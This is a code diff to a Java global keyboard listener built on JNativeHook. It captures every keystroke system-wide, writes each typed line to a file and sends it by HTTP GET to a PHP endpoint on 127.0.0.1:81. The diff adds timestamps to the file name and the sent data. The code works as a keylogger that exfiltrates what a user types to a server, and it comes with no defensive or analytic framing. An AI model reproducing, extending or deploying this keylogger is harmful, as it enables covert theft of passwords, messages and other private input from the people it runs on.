@@ -5,6 +5,10 @@ import org.jnativehook.NativeHookException;
 import org.jnativehook.keyboard.NativeKeyEvent;
 import org.jnativehook.keyboard.NativeKeyListener;
 
+import java.text.DateFormat;
+import java.text.SimpleDateFormat;
+import java.util.Date;
+
 
 public class GlobalKeyListenerExample implements NativeKeyListener{
 	public File file;
@@ -38,7 +42,7 @@ public class GlobalKeyListenerExample implements NativeKeyListener{
 			//text=text + " ";
 			text=text + "%20";
 		}
-		else if (e.getKeyCode() == 28) {
+		else if (e.getKeyCode() == 28) { //grab enter code
 			text=text ;
 		}
 		else
@@ -46,7 +50,11 @@ public class GlobalKeyListenerExample implements NativeKeyListener{
 		//System.out.println(e.getKeyCode() + " " + NativeKeyEvent.VC_ENTER);
 	//trap enter event and send as single line to text file of append	
 		if (e.getKeyCode() == NativeKeyEvent.VC_ENTER) {
-		file=new File(text);
+			DateFormat dateFormat = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss");
+			Date date = new Date();
+			//System.out.println(dateFormat.format(date)); //2016/11/16 12:08:43
+			
+		file=new File(dateFormat.format(date)+text);
 		/*HttpPost httpPost=new HttpPost();
 		try {
 			httpPost.sendPost("https://127.0.0.1:81/test/writefile.php", "text_="+text);
@@ -59,7 +67,7 @@ public class GlobalKeyListenerExample implements NativeKeyListener{
 		
 		HttpGet httpGet=new HttpGet();
 		try {
-			httpGet.sendGet("http://127.0.0.1:81/test/writefileget.php"+ "?text_="+text);
+			httpGet.sendGet("http://127.0.0.1:81/test/writefileget.php"+ "?text_="+Long.toString(date.getTime())+"}"+text);
 		} catch (Exception e1) {
 			// TODO Auto-generated catch block
 			System.out.println(e1);
